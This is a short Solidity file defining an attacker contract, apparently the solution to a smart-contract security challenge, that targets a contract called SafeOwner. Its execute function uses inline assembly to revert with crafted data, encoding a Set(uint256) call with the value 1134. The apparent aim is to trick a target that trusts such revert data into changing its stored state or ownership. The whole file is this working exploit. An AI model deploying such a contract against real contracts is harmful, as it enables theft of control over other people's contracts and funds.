pragma solidity ^0.4.23;

import "./SafeOwner.sol";

contract SafeOwnerAttacker {
    
    address public owner;
    bytes4 internal constant _sel = bytes4(keccak256('Set(uint256)'));

    function execute(address) public {
        owner = msg.sender;

        bytes4 sel = _sel;
        assembly {
            // Store sel in memory @ 0x0
            mstore(0, sel)
            mstore(0x4, 1134)
            revert(0, 0x24)
        }
    }
}